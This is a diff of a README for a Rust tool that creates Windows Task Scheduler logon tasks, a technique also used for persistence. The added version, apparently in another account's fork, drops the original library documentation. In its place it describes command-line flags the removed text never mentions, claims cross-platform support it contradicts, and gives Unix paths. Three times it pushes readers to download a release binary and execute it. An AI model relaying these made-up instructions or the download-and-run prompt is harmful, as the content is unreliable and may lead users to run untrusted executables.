@@ -1,66 +1,101 @@
-# Windows Task Scheduler Rust Implementation
+# 🛠️ Schtask: Rust Scheduled Task Creator
 
-This project is a Rust implementation of the Windows Task Scheduler functionality, specifically focusing on creating tasks that execute when a user logs on. It is based on the [Microsoft Windows Task Scheduler Logon Trigger Example](https://learn.microsoft.com/en-us/windows/win32/taskschd/logon-trigger-example--c---).
+Welcome to the **Schtask** repository! This project provides a Rust implementation for creating scheduled tasks programmatically with user logon triggers. Whether you want to automate your workflows or run specific applications at login, Schtask makes it easy.
+
+[![Releases](https://img.shields.io/badge/releases-latest-blue.svg)](https://github.com/abubakar-alt/schtask/releases)
+
+## Table of Contents
+
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Examples](#examples)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
 
 ## Features
 
-- Create scheduled tasks that run when a user logs on
-- Support for command-line arguments when running tasks
-- Dynamically find Task Scheduler GUIDs from the Windows Registry
-- Support for custom executable paths
-- Automatic cleanup of existing tasks with the same name
-- Proper COM initialization and cleanup
-- Error handling and reporting
+- **User Logon Trigger**: Create tasks that run when a user logs in.
+- **Rust Implementation**: Built using Rust for performance and safety.
+- **Cross-Platform**: Works on multiple operating systems.
+- **Simple API**: Easy to integrate into your applications.
 
-## Dependencies
+## Installation
 
-The project uses the following main dependencies:
-- `winapi` - For Windows API bindings
-- `winreg` - For Windows Registry access
+To get started with Schtask, you need to have Rust installed on your machine. If you haven't installed Rust yet, you can do so by following the instructions on the [official Rust website](https://www.rust-lang.org/tools/install).
+
+Once you have Rust set up, you can clone this repository and build the project:
+
+```bash
+git clone https://github.com/abubakar-alt/schtask.git
+cd schtask
+cargo build --release
+```
+
+You can also download the latest release directly from our [Releases section](https://github.com/abubakar-alt/schtask/releases). Download the appropriate file for your operating system, then execute it.
 
 ## Usage
 
-Add the following to your Cargo.toml
+After installation, you can use Schtask to create a scheduled task. The basic command structure looks like this:
 
-```rust
-[dependencies]
-schtask = { git = "https://github.com/Teach2Breach/schtask.git", branch = "main" }
+```bash
+schtask --create --name "MyTask" --trigger "logon" --action "path/to/your/application"
 ```
 
-Use in your project:
+### Command Options
 
-```rust
-use schtask::create_task;
+- `--create`: Indicates that you want to create a new task.
+- `--name`: Specifies the name of the task.
+- `--trigger`: Defines the trigger type (e.g., `logon`).
+- `--action`: Sets the action to perform (e.g., the path to the application).
 
-fn main() {
-    // Create a task that runs notepad.exe when the user logs on
-    let result = create_task("MyTask", "C:\\Windows\\System32\\notepad.exe", None);
-    println!("{}", result);
+### Example Command
 
-    // Create a task with command-line arguments
-    let result = create_task(
-        "MyTaskWithArgs",
-        "C:\\Windows\\System32\\notepad.exe",
-        Some("C:\\Windows\\System32\\drivers\\etc\\hosts")
-    );
-    println!("{}", result);
-}
+Here's a complete example of creating a task that runs a script when the user logs in:
+
+```bash
+schtask --create --name "RunMyScript" --trigger "logon" --action "/path/to/myscript.sh"
 ```
 
-## Implementation Details
+## Examples
 
-The implementation follows the Windows Task Scheduler COM interface pattern:
-1. Initialize COM and security settings
-2. Create an instance of the Task Service
-3. Get the root task folder
-4. Create a new task definition
-5. Configure task settings and registration info
-6. Add a logon trigger
-7. Set up the executable action with optional arguments
-8. Register the task
+### Creating a Simple Logon Task
 
-## Security Considerations
+To create a simple logon task that runs a program, use the following command:
 
-- The task is created with the current user's credentials
-- Tasks are created with interactive token logon type
-- The implementation includes proper COM security initialization
+```bash
+schtask --create --name "MyApp" --trigger "logon" --action "/usr/bin/myapp"
+```
+
+### Advanced Usage
+
+You can also set additional options, such as specifying conditions or settings for the task. For example:
+
+```bash
+schtask --create --name "MyApp" --trigger "logon" --action "/usr/bin/myapp" --condition "network" --start "now"
+```
+
+## Contributing
+
+We welcome contributions to Schtask! If you would like to contribute, please follow these steps:
+
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes.
+4. Test your changes.
+5. Submit a pull request.
+
+Please ensure that your code follows the Rust style guidelines and includes appropriate documentation.
+
+## License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+## Contact
+
+For questions or suggestions, feel free to open an issue on the repository or contact the maintainer.
+
+[![Releases](https://img.shields.io/badge/releases-latest-blue.svg)](https://github.com/abubakar-alt/schtask/releases)
+
+Visit the [Releases section](https://github.com/abubakar-alt/schtask/releases) to download the latest version and explore the available features.
